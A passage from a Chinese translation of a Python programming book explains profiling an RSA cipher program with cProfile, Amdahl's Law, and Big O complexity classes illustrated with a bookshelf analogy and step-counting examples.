Starch的网站上下载rsaCipher.py和al_sweigart_pubkey.txt。这个RSA密码程序在《Python密码学编程》中有所提及。在交互式shell中输入以下内容，以分析<code>encryptAndWriteToFile()</code>函数对由<code>&#39;abc&#39;*100000</code>表达式创建的30万个字符长的信息的加密过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> cProfile, rsaCipher<br><span class="hljs-meta">&gt;&gt;&gt; </span>cProfile.run(<span class="hljs-string">&quot;rsaCipher.encryptAndWriteToFile(&#x27;encrypted_file.txt&#x27;, &#x27;al_sweigart_pubkey. txt&#x27;, &#x27;abc&#x27;*100000)&quot;</span>)<br>         <span class="hljs-number">11749</span> function calls <span class="hljs-keyword">in</span> <span class="hljs-number">28.900</span> seconds<br><br>   Ordered by: standard name<br><br>   ncalls  tottime  percall  cumtime  percall filename:lineno(function)<br>        <span class="hljs-number">1</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">0.001</span>   <span class="hljs-number">28.900</span>   <span class="hljs-number">28.900</span> &lt;string&gt;:<span class="hljs-number">1</span>(&lt;module&gt;)<br>        <span class="hljs-number">2</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span> _bootlocale.py:<span class="hljs-number">11</span>(getpreferredencoding)<br>--snip--<br>        <span class="hljs-number">1</span>    <span class="hljs-number">0.017</span>    <span class="hljs-number">0.017</span>   <span class="hljs-number">28.900</span>   <span class="hljs-number">28.900</span> rsaCipher.py:<span class="hljs-number">104</span>(encryptAndWriteToFile)<br>        <span class="hljs-number">1</span>    <span class="hljs-number">0.248</span>    <span class="hljs-number">0.248</span>    <span class="hljs-number">0.249</span>    <span class="hljs-number">0.249</span> rsaCipher.py:<span class="hljs-number">36</span>(getBlocksFromText)<br>        <span class="hljs-number">1</span>    <span class="hljs-number">0.006</span>    <span class="hljs-number">0.006</span>   <span class="hljs-number">28.873</span>   <span class="hljs-number">28.873</span> rsaCipher.py:<span class="hljs-number">70</span>(encryptMessage)<br>        <span class="hljs-number">1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span> rsaCipher.py:<span class="hljs-number">94</span>(readKeyFile)<br>--snip--<br>     <span class="hljs-number">2347</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span> &#123;built-<span class="hljs-keyword">in</span> method builtins.<span class="hljs-built_in">len</span>&#125;<br>     <span class="hljs-number">2344</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span> &#123;built-<span class="hljs-keyword">in</span> method builtins.<span class="hljs-built_in">min</span>&#125;<br>     <span class="hljs-number">2344</span>   <span class="hljs-number">28.617</span>    <span class="hljs-number">0.012</span>   <span class="hljs-number">28.617</span>    <span class="hljs-number">0.012</span> &#123;built-<span class="hljs-keyword">in</span> method builtins.<span class="hljs-built_in">pow</span>&#125;<br>        <span class="hljs-number">2</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">0.000</span> &#123;built-<span class="hljs-keyword">in</span> method io.<span class="hljs-built_in">open</span>&#125;<br>     <span class="hljs-number">4688</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">0.000</span> &#123;method <span class="hljs-string">&#x27;append&#x27;</span> of <span class="hljs-string">&#x27;list&#x27;</span> objects&#125;<br>--snip--<br></code></pre></td></tr></table></figure><p>可以看到，传递给函数<code>cProfile.run()</code>的代码共运行了28.9秒。注意这个示例中运行总时间最多的函数。Python内置函数<code>pow()</code>花了28.617秒，几乎等于总耗时！我们没法改变<code>pow()</code>的代码（因为它是Python的内置函数），但也许可以改变程序的代码以减少对它的调用。</p><p>　　在这个示例中，这是不可能的，因为rsaCipher.py已经经过充分的优化。不过对这段代码的分析还是让我们了解到<code>pow()</code>是主要瓶颈。因此，试图改进<code>readKeyFile()</code>等函数（该函数的运行时间很短，<code>cProfile</code>将其时间报告为0）是没有意义的。</p><p>　　<strong>阿姆达尔定律</strong>（Amdahl’s Law）体现了这一思想，其计算了其中一个组件得到改进的情况下对整个程序的运行速度的增益。该公式为<code>整个任务的速度=1/((1-p)+(p/s))</code>，其中<code>s</code>是一个组件的速度提升，<code>p</code>是该组件在整个程序中的比例。比如将一个在程序中占总运行时间90%的组件速度提升一倍，结果是<code>1/((1-0.9)+(0.9/2)) = 1.818</code>，也就是说整个程序的速度提升了约82%。这比将一个只占总运行时间25%的组件的速度提升3倍要好，它的结果是<code>1/((1-0.25)+(0.25/2))=1.143</code>，也就是整体速度提升了约14%。你不需要背整个公式，只要记住将代码中运行时间长的代码速度提升一倍，要比将已经够快的代码速度提升一倍更有效。这是一个常识：昂贵的房子打9折要比便宜的鞋子打9折更有诱惑力。</p><h2 id="13-3-大O算法分析"><a href="#13-3-大O算法分析" class="headerlink" title="13.3　大O算法分析"></a>13.3　大O算法分析</h2><p>　　大O是一种算法分析形式，它描述了代码如何应对处理规模的增长。它将代码分为几个等级，笼统地描述代码的运行时间随着处理工作量的增加而需要增加的时间。Python开发者Ned Batchelder将大O描述为对“代码如何随着数据增长而变慢”的分析。这也是他在PyCon 2018上的演讲主题。</p><p>　　假设这样一个情景：你有一些工作需要一小时才能完成，如果工作量增加一倍，需要花多少时间才能完成工作？你可能会说两小时，但实际上答案取决于工作的类型。</p><p>　　如果读一本薄书需要一小时，那么读两本薄书大概就要两小时。如果你能在一小时内将500本书按照书名的字母顺序排列，将1000本书按照字母顺序排列花费的时间就不止两小时，因为你必须在更大的图书集合中为每本书找到正确的位置。如果工作只是检查书架是否是空的，那么书架上无论有0本、10本还是1000本都无所谓。只要看一眼就会立刻知道答案。无论有多少本书，需要的时间都是差不多的。尽管不同的人在阅读或者编排字母时的速度存在个体差异，但总体来说趋势是一样的。</p><p>　　算法的大O描述了这种趋势。大O描述算法的总体表现与执行该算法的实际硬件速度的快慢无关。大O不使用任何具体的单位（比如秒或者CPU周期)来描述算法的运行时间，因为运行时间在不同的计算机或编程语言之间会有差异。</p><h2 id="13-4-大O阶"><a href="#13-4-大O阶" class="headerlink" title="13.4　大O阶"></a>13.4　大O阶</h2><p>　　大O记法通常有以下几个等级，它们的顺序是从低到高，也就是从随着数据量增长速度减慢最少的代码到速度减慢最多的代码：</p><p>　　(1) O(1)，恒定时间（最低)</p><p>　　(2) O(\log n)，对数时间</p><p>　　(3) O(n)，线性时间</p><p>　　(4) O(n\log n)，N-Log-N时间</p><p>　　(5) O(n^2)，多项式时间</p><p>　　(6) O(2^n)，指数时间</p><p>　　(7) O(n!)，阶乘时间（最高）</p><p>　　注意，大O阶使用了以下符号：一个大写的O，后面是一对小括号，括号中是对阶数的描述。大写的O表示<strong>阶数</strong>（order）。n表示代码要处理的输入数据的大小。</p><p>　　使用大O记法无须理解对数、多项式等词的精确的数学意义。下一节将详细描述这些阶数，这里先给出简化的解释：</p><ul><li>O(1)算法和O(\log n)算法很快；</li><li>O(n)算法和O(n\log n)]算法还不错；</li><li>O(n^2)算法、O(2^n)算法和O(n!)算法很慢。</li></ul><p>　　当然你可以找出反例，但大多数情况下，上述结论是对的。还有很多大O阶未被列出，这里给出的是最常用的。现在逐个看看每个阶数所描述的任务种类。</p><h3 id="13-4-1-使用书架打比方描述大O阶"><a href="#13-4-1-使用书架打比方描述大O阶" class="headerlink" title="13.4.1　使用书架打比方描述大O阶"></a>13.4.1　使用书架打比方描述大O阶</h3><p>　　在下面的大O阶例子中，我将继续使用书架的比喻。n指的是书架上的书的数量，大O阶描述了随着书的数量的增加，各种任务所花费的时间是如何增加的。</p><ol><li><p><strong>O(1)，恒定时间</strong></p><p>找到“书架是否是空的”的答案是恒定时间的操作。书架上到底有多少书并不重要，只要看一眼就能判断书架是否是空的。做出这个判断所用的时间与书的数量多少无关，因为只要看到书架上有一本书，就可以停止寻找了。因为n值与执行任务的时间无关，所以O(1)中并不包含n。有时，恒定时间也被写作O(c)。</p></li><li><p><strong>O(\log n)，对数时间</strong></p><p>对数是指数的逆运算：指数[2^4，也就是2 × 2 × 2 × 2，等于16。而对数 log_2(16（读作以2为底16的对数）等于4。在编程中，我们一般使用2作为对数基数，所以将O(\log_2n简写为O(\log n)。</p><p>在一个按照字母顺序排列的书架上搜索某本书是一个对数时间的操作。为了找到一本书，你可以先检查在书架中间位置的那本书。如果它就是你要找的书，那么任务就完成了。如果不是，你要确定想找的书是在中间这本书的前面还是后面。这么做可以有效地将找书范围缩减至一半。接下来不断重复这个过程，在一半范围内检查处于中间位置的书。这被称为二分搜索算法，13.5.2节中有一个示例。</p><p>​      </p><p>将一组书分为两半的次数一共是log_2n次。在一个有16本书的书架上，最多需要4步就能找到想找的书，因为每一步都会将需要继续搜索的书的范围缩减一半。如果书架上的书增加一倍，也只需要多搜索一次。如果一个书架按照字母顺序排列有42亿本书，也只需要32步就能找到某本书。</p><p>O(\log n)算法通常包括一个划分和消化的步骤，即从n个输入中选择一半进行处理，再从这一半中选择一半，以此类推。log n运算的可扩展性很好：工作量增加一倍，运算时间只增加一步。</p></li><li><p><strong>O(n)，线性时间</strong></p><p>阅读书架上的所有书是一个线性时间的操作。如果书的厚度差不多，将书架上的书的数量增加一倍，那么读完所有书就需要大约两倍的时间。运算时间与书的数量n成比例增加。</p></li><li><p><strong>O(n\log n)，N-Log-N时间</strong></p><p>将一组书按照字母顺序排序是一个N-Log-N时间的操作。这个阶数是O(n)和O(\log n)的运行时间相乘的结果。可以将O(n\log n)]的任务看成一个需要被执行n次的O(\log n)任务。下面对原因做一个通俗的解释。</p><p>我们有一摞需要按照字母顺序排列的书和一个空书架。按照前文描述的二分搜索算法的步骤，找到书架上某本书的位置是O(\log n)的操作。如果有n本书需要按字母顺序排列，而每本书按照字母顺序排列都需要log n步，按照字母顺序排列整个书架需要的步骤就是n x log n，或者 log n x  n。如果书的数量变成原来的两倍，将所有书按照字母顺序排列也只需要两倍多一点的时间。所以O(n\log n)]算法的增长速度是较慢的。</p><p>事实上，所有高效的排序算法都是O(n\log n)]的：合并排序、快速排序、堆排序和TimSort。（TimSort是由Tim Peters发明的，Python的<code>sort()</code>方法使用的就是该算法。）</p></li><li><p><strong>O(n^2)，多项式时间</strong></p><p>在一个没有排序的书架上检查是否存在重复的书是一个多项式时间的操作。如果有100本书，那么你可以从第一本开始，拿起来跟其他99本书比较，看看是否相同。接着拿起第二本、第三本……分别和其他99本书比较，检查一本书是否跟其他书重复需要99个步骤（四舍五入成100，也就是这个示例中的n）。而我们需要对每本书都进行一次操作，也就是一共100次。因此检查书架上是否存在重复书的步骤大约是n x n ，也就是n^2。（即使我们足够聪明，不去重复比较，也需要执行近n^2步。)</p><p>运行时间以增加的图书数量的平方成比例增加。检查100本书中是否有重复需要10 000步（100 × 100）。而检查两倍于这个数量的书，也就是200本书，则需要40 000步（200 × 200），即以前的4倍。</p><p>根据我自己的实际编码经验，大O分析最常见的用途是避免在问题存在O(n\log n)]或O(n)的算法时意外地编写一个O(n^2)算法。O(n^2)阶意味着算法的速度随着规模增加急剧下降。如果你的代码是O(n^2)阶或更高，应该先暂停，思考是否可能有另一种算法能够更快地解决问题。为了应对这种问题，无论是在大学里还是在网上，学习数据结构和算法课程会有所帮助。</p><p>O(n^2)也被称为二次方时间。算法的复杂度还可能是O(n^3)，即立方时间，或者O(n^4)，即四次方时间，又或者是其他多项式时间。它们的速度随着指数的增大而变慢。</p></li><li><p><strong>O(2^n)，指数时间</strong></p><p>给书架上所有书的组合拍照是一个指数时间的操作。想象一下：书架上的每本书要么在照片中，要么不在照片中。图13-1显示了n为1、2、3时的所有组合。如果n为1，会有两张照片：有书或没书。如果n为2，则有4张照片：两本书都在书架上、两本书都不在、第一本书在而第二本不在、第二本书在而第一本不在。当数量增加到3本书时，你要做的工作又增加了一倍：你需要对两本书的每个子集中再考虑第三本书在（4张照片）或不在（另外4张照片）的情况（一共是8张照片，因为2^3&#x3D;8。每增加一本书，工作量就增加一倍。如果有n本书，需要拍摄的照片数量（也就是工作量）是2^n。</p><p><img src="/./img/python/image00381.jpg" alt="image00381"></p><p><strong>图13-1　书架上有一本、两本、三本书时的所有组合</strong></p><p>指数级任务的运行时间增加得很快。6本书需要2^6即64张照片，32本书则需要2^32即超过42亿张照片。O(2^n)、O(3^n)、O(4^n)等虽然阶数不同，但时间复杂度都属于指数级。</p><p>​      </p></li><li><p><strong>O(n!)，阶乘时间</strong></p><p>把书架上的书按照所有顺序拍照是一个阶乘时间的操作。这些书的所有顺序被称为n本书的排列组合，结果是n!，也就是n的阶乘。一个数字的阶乘是不超过该数的所有正整数的乘积。比如3是3 × 2 × 1，即6。图13-2展示了3本书可能出现的所有排列组合。</p><p><img src="/./img/python/image00388.jpg" alt="image00388"></p><p><strong>图13-2　书架上3本书的全部6种排列组合</strong></p><p>思考如何得到n本书的每种排列组合。第一本书有n种可能的选择；第二本书有n-1种可能的选择（除了第一本书之外的每一本书都可以被选作第二本）；第三本书有n-2种选择，以此类推。当有6本书时，就存在6!种选择，也就是6 × 5 × 4 × 3 × 2 × 1，即720张照片。而再增加一本书，结果就是7!，即5040张照片。即使n值并不大，阶乘时间的算法也很快变得不能在合理时间内完成。如果你有20本书供排列，就算1张照片的拍摄时间只有1秒，它仍然需要比宇宙存在的时间还要长的时间拍摄完所有排列组合。</p><p>一个著名的O(n!)问题是旅行商问题。一个销售员要访问n个城市，希望计算出他需要访问的n个城市不同顺序的旅行总距离，再根据其计算结果确定旅行总距离最短的访问顺序。在城市很多时，该任务被证明无法很快完成，但幸运的是，优化算法可以找到一条相对距离较短（但不保证是最短）的路线，运算所用时间要比O(n!)短得多。</p></li></ol><h3 id="13-4-2-大O测量的是最坏情况"><a href="#13-4-2-大O测量的是最坏情况" class="headerlink" title="13.4.2　大O测量的是最坏情况"></a>13.4.2　大O测量的是最坏情况</h3><p>　　大O专用于测量任务的最坏情况。比如要在一个无序的书架上找到一本特定的书，你需要从一头开始搜寻，直到找到它。你可能很幸运，查看的第一本书就是你要找的书。但你也可能不走运，查看的最后一本书才是你要找的书，或者它根本就不在书架上。因此，在最好的情况下，即使书架上有几十亿本待搜索的书也无所谓，反正你会立刻找到要找的书。但是这种乐观的态度对算法分析来说毫无意义。大O描述的是在不幸运的情况下发生的事情：如果书架上有n本书，那么你将不得不查看完所有书。在这种情况下，运行时间的增加速度与书的数量增加的速度相同。</p><p>　　一些程序员还会使用大Omega符号描述算法的最佳情况。比如，一个!\mathit{\Omega}(n)算法在最好的情况下会具有线性效率。而在最坏的情况下，它可能表现得更慢。有些算法会遇到特别幸运的情况，即不需要做任何工作。比如，任务是找到前往目的地的驾驶路线，而你就在目的地。</p><p>　　大Theta符号则表示算法的最好情况和最坏情况下的阶数相同。比如，\mathit{\Theta}(n)描述了一个在最好情况和最坏情况下都具有线性效率的算法，也就是说，它既是O(n)算法，也是\mathit{\Omega}(n)算法。在软件工程中，这些符号不如大O常用，但你还是应该知道它们。</p><p>　　在谈论“平均情况下的大O”时，人们指的是大Theta；在谈论“最佳情况下的大O”时，指的是大Omega，这并不稀奇。他们的说法严格来说是矛盾的。大O具体指的是一个算法的最坏情况下的运行时间。但即使他们的措辞在技术上不正确，你也应该能够理解他们的意思。</p><blockquote><p><strong>理解大O所需的数学知识</strong></p><p>　　如果你对代数生疏了，复习以下数学知识就足以帮助你进行大O分析。</p><ul><li>乘法：加法的重复，2 × 4 &#x3D; 8就相当于2 + 2 + 2 + 2 &#x3D; 8。使用变量进行抽象，!n+n+n相当于3 x n。</li><li>乘法符号：在代数中，乘法符号×经常被省略。2 x n会被写作!2n。当操作数都是数字时，2 × 3会被写作2(3)，即6。</li><li>乘法同一性：一个数乘以1结果是这个数本身。如5 × 1 &#x3D; 5，42 × 1 &#x3D; 42。更笼统的描述是：n x 1&#x3D;n。</li><li>乘法分配律：2 × (3 + 4) &#x3D; (2 × 3) + (2 × 4)，等式两边都等于14。更笼统的描述是：a(b + c) &#x3D; ab + ac。</li><li>幂是重复的乘法：[2^4&#x3D;16（读作2的4次方等于16）。这和2 × 2 × 2 × 2 &#x3D; 16一样。这个示例中的2是基数，4是指数。使用变量进行抽象，n x n x n x n相当于n^4]。在Python中，我们使用<code>**</code>运算符表示幂运算：<code>2**4</code>的结果是16。</li><li>1次方的结果就是基数本身，如2^1&#x3D;2，9999^1&#x3D;9999。更笼统的描述是：n^1&#x3D;n。</li><li>0次方的结果都是1，如2^0&#x3D;1，9999^0&#x3D;1。更笼统的描述是：n^0&#x3D;1。</li><li>系数是乘法因数：在3n^2+4n+5中，系数是3、4、5。可以看到，5被视为系数的原因是它可以被写作5(1)，即5n^0。</li><li>对数是幂运算的逆运算：由于2^4&#x3D;16，因此\log_2(16)&#x3D;4，它的念法是“以2为底16的对数是4”。在Python中，我们使用<code>math.log()</code>函数求解：<code>math.log(16, 2)</code>的结果为4.0。</li></ul><p>　　计算大O时经常需要通过合并同类项来简化方程。项是一些数字和变量相乘的组合：在3n^2+4n+5中，项是3n^2、4n和5。同类项是指它们的变量及指数都相同。在表达式3n^2+4n+6n+5中，项4n和6n是同类项。可以将该表达式简写成3n^2+10n+5。</p><p>　　请记住，由于n x 1&#x3D;n，像3n^2+5n+4这样的表达式可以被认为是3n^2+5n+4(1)。这个表达式中的项与大O阶的O(n^2)、O(n)和O(1)类似。这一点在后面为大O的计算舍弃系数时会出现。</p><p>　　当你首次学习计算一段代码的大O时，这些数学规则可能会派上用场。但在完成13.5.4节的学习后，你可能就不需要它们了。大O是一个简单的概念，即使没有严格遵循数学规则，依然能衡量算法的快慢。</p></blockquote><h2 id="13-5-确定代码的大O阶"><a href="#13-5-确定代码的大O阶" class="headerlink" title="13.5　确定代码的大O阶"></a>13.5　确定代码的大O阶</h2><p>　　确定一段代码的大O阶需要进行4项工作：确定n是什么，计算代码中的步骤数，去除低阶项，去除系数。</p><p>　　比如，为下面的<code>readingList()</code>函数计算大O阶：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def readingList(books):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Here are the books I will read:&#x27;</span>)<br>    numberOfBooks = 0<br>    <span class="hljs-keyword">for</span> book <span class="hljs-keyword">in</span> books:<br>        <span class="hljs-built_in">print</span>(book)<br>        numberOfBooks += 1<br>    <span class="hljs-built_in">print</span>(numberOfBooks, <span class="hljs-string">&#x27;books total.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>　　回顾一下，n代表代码处理的输入数据的规模。在函数中，n几乎总是作为参数。<code>readingList()</code>函数的唯一参数是<code>books</code>，所以<code>books</code>的大小似乎是n的一个很好的候选项，因为<code>books</code>越大，函数运行的时间就越长。</p><p>　　接下来计算这段代码中的步骤数。步骤的定义是模糊的，将一行代码视为一个步骤是个不错的规则。循环有多少步，最终的步骤数量就等于迭代次数乘以循环体中的代码行数。为了方便理解，下面给出<code>readingList()</code>函数内的代码的步骤数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">readingList</span>(<span class="hljs-params">books</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Here are the books I will read:&#x27;</span>)     <span class="hljs-comment"># 1步</span><br>    numberOfBooks = <span class="hljs-number">0</span>                            <span class="hljs-comment"># 1步</span><br>    <span class="hljs-keyword">for</span> book <span class="hljs-keyword">in</span> books:                           <span class="hljs-comment"># 单次循环内的步骤数 * n</span><br>        <span class="hljs-built_in">print</span>(book)                              <span class="hljs-comment"># 1步</span><br>        numberOfBooks += <span class="hljs-number">1</span>                       <span class="hljs-comment"># 1步</span><br>    <span class="hljs-built_in">print</span>(numberOfBooks, <span class="hljs-string">&#x27;books total.&#x27;</span>)         <span class="hljs-comment"># 1步</span><br></code></pre></td></tr></table></figure><p>除了<code>for</code>循环，每行代码都被视作一个步骤。<code>for</code>循环对于<code>books</code>中的每一项都会执行一次，因为<code>books</code>的规模是n，所以它执行了n步。不仅如此，<code>for</code>循环内的所有步骤也被一并执行了n次。因为循环中共有两个步骤，所以总步骤数是2 x n。可以这样描述步骤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">readingList</span>(<span class="hljs-params">books</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Here are the books I will read:&#x27;</span>)     <span class="hljs-comment"># 1步</span><br>    numberOfBooks = <span class="hljs-number">0</span>                            <span class="hljs-comment"># 1步</span><br>    <span class="hljs-keyword">for</span> book <span class="hljs-keyword">in</span> books:                           <span class="hljs-comment"># n * 2 步</span><br>        <span class="hljs-built_in">print</span>(book)                              <span class="hljs-comment">#（已归并计算）</span><br>        numberOfBooks += <span class="hljs-number">1</span>                       <span class="hljs-comment">#（已归并计算）</span><br>    <span class="hljs-built_in">print</span>(numberOfBooks, <span class="hljs-string">&#x27;books total.&#x27;</span>)         <span class="hljs-comment"># 1步</span><br></code></pre></td></tr></table></figure><p>　　计算总步骤数时，得到的结果就是1+1+(n\times2)+1。这个表达式可以简写为2n+3。</p><p>　　大O并不会用来描述具体细节，它只是一个笼统的指标。所以我们可以去掉低阶项。2n+3中的阶数包括线性阶(2n)和常数阶(3)，我们保留最大的阶数，也就是2n。</p><p>　　接下来，我们从中去除系数。2n的系数是2，去掉它后就只剩下n。最终<code>readingList()</code>函数的大O阶是O(n)，也就是线性时间复杂度。</p><p>　　这个阶数应该是经得起推敲的。函数运行中有很多步骤，总体来说，如果<code>books</code>列表的数量增大10倍，运行时间也会增大到10倍左右。将图书从10本增加到100本，增加前的步骤数为1 + 1 + (2 × 10) + 1，即23步，而增加后则为1 + 1 + (2 × 100) + 1，即203步。203大约是23的10倍，所以运行时间确实是随着n的增加成比例地增加了。</p><h3 id="13-5-1-为什么低阶项和系数不重要"><a href="#13-5-1-为什么低阶项和系数不重要" class="headerlink" title="13.5.1　为什么低阶项和系数不重要"></a>13.5.1　为什么低阶项和系数不重要</h3><p>　　我们在步骤的计算过程中删除了低阶项，因为随着n的增长，它们变得不那么重要。如果将前面提到的<code>readingList()</code>函数中的<code>books</code>规模从10增加到10 000 000 000（100亿），那么步骤数将从23增加到20 000 000 003。由此可见，当n足够大时，额外多的3步影响不大。</p><p>　　当数据量增加时，低阶项即使有较大的系数也不足以造成太大影响。当n的值一定时，高阶复杂度的代码总是比低阶的运算慢。假设有一个名为<code>quadraticExample()</code>的函数，其算法复杂度为O(n^2)，具体步骤数为3n^2。同时，另有一个名为<code>linearExample()</code>的函数，其算法复杂度为O(n)，具体步骤数为1000n。系数1000比系数3大，但起不了什么作用，随着n的增加，最终O(n^2)平方运算会变得比O(n)线性运算慢。实际代码是什么样并不重要，可以假设代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">quadraticExample</span>(<span class="hljs-params">someData</span>):  <span class="hljs-comment"># someData的规模是n</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> someData:           <span class="hljs-comment"># n步</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> someData:       <span class="hljs-comment"># n步</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something&#x27;</span>)   <span class="hljs-comment"># 1步</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something&#x27;</span>)   <span class="hljs-comment"># 1步</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something&#x27;</span>)   <span class="hljs-comment"># 1步</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">linearExample</span>(<span class="hljs-params">someData</span>):     <span class="hljs-comment"># someData的规模是n</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> someData:           <span class="hljs-comment"># n 步</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):    <span class="hljs-comment"># 1 * 1000 步</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something&#x27;</span>)   <span class="hljs-comment"># （已归并计算）</span><br></code></pre></td></tr></table></figure><p>与<code>quadraticExample()</code>的系数（3）相比，<code>linearExample()</code>的系数很大（1000）。如果输入n的大小为10，那么O(n^2)函数只需要300步，而O(n)函数则需要10 000步，前者快很多。</p><p>　　需要注意的是，大O记法主要关注的是算法在工作量较大时的性能。当n达到334或以上的规模时，<code>quadraticExample()</code>函数总是比<code>linearExample()</code>函数慢。即使<code>linearExample()</code>有1<del>000</del>000n步，一旦n达到333 334，<code>quadraticExample()</code>函数仍然会是更慢的那个。而在某些时候，O(n^2)的运算会比O(n)或阶数更低的运算慢。为了说明这种情况，请看图13-3中的大O阶的图示。这张图展示了所有主要的大O阶。x轴代表n，即数据的规模，y轴代表进行运算所需要的运行时间。</p><p><img src="/./img/python/image00426.jpg" alt="image00426"></p><p><strong>图13-3　大O阶图示</strong></p><p>　　如图13-3所示，高阶复杂度的运行时间比低阶的运行时间增长得快。虽然低阶因有大系数会暂时大于高阶，但高阶的运行时间最终还是会超过它们。</p><h3 id="13-5-2-大O分析实例"><a href="#13-5-2-大O分析实例" class="headerlink" title="13.5.2　大O分析实例"></a>13.5.2　大O分析实例</h3><p>　　让我们确定示例函数的大O阶。示例会使用一个名为<code>books</code>的参数，它是一个包含书名字符串的列表。</p><p>　　<code>countBookPoints()</code>函数根据<code>books</code>中的书计算出一个分数。大多数的书为1分，某位作者的书为2分：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">def countBookPoints(<span class="hljs-keyword">books):</span><br><span class="hljs-keyword"></span>    points = <span class="hljs-number">0</span>                        <span class="hljs-comment"># 1步</span><br>    for <span class="hljs-keyword">book </span>in <span class="hljs-keyword">books: </span>               <span class="hljs-comment"># 单次循环内的步骤数 * n</span><br>        points += <span class="hljs-number">1</span>                   <span class="hljs-comment"># 1步</span><br><br>    for <span class="hljs-keyword">book </span>in <span class="hljs-keyword">books: </span>               <span class="hljs-comment"># 单次循环内的步骤数 * n</span><br>        if <span class="hljs-string">&#x27;by Al Sweigart&#x27;</span> in <span class="hljs-keyword">book: </span> <span class="hljs-comment"># 1步</span><br>            points += <span class="hljs-number">1</span>               <span class="hljs-comment"># 1步</span><br>    return points                     <span class="hljs-comment"># 1步</span><br></code></pre></td></tr></table></figure><p>　　步骤数为1+(n x 1)+(n x 2)+1，合并同类项后变成3n+2，去掉低阶项和系数后则为O(n)，也就是线性复杂度。无论在<code>books</code>中循环1次、2次还是10亿次，复杂度都是O(n)。</p><p>　　到目前为止，所有的单层循环示例都具有线性复杂度，那是因为这些循环迭代了n次。但接下来的示例会说明，代码中仅有一层循环并不意味着一定具有线性复杂度，尽管对数据进行迭代的循环本身是线性的。</p><p>　　<code>iLoveBooks()</code>函数打印了“I LOVE BOOKS!!!”和“BOOKS ARE GREAT!!!”各10次：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">iLoveBooks</span>(<span class="hljs-params">books</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):              <span class="hljs-comment"># 单次循环内的步骤数 * 10</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I LOVE BOOKS!!!&#x27;</span>)     <span class="hljs-comment"># 1步</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BOOKS ARE GREAT!!!&#x27;</span>)  <span class="hljs-comment"># 